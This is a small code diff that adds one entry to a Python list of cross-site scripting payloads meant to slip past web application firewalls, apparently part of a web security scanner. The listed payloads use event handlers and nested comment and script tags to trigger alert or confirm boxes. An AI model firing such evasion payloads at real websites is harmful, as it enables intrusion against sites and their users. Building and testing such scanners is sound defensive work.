@@ -365,7 +365,8 @@ _waf_payloads = [
     '<d3v/onauxclick=(((confirm)))">click',
     '<d3v/onmouseleave=[2].some(confirm)>click',
     '<details/open/ontoggle=alert()>',
-    '<details/open/ontoggle=(confirm)()//'
+    '<details/open/ontoggle=(confirm)()//',
+    "<!--<script>'/*</script>-->*/;alert(1)\n</script",
 ]
 
 # payload with html 5 features
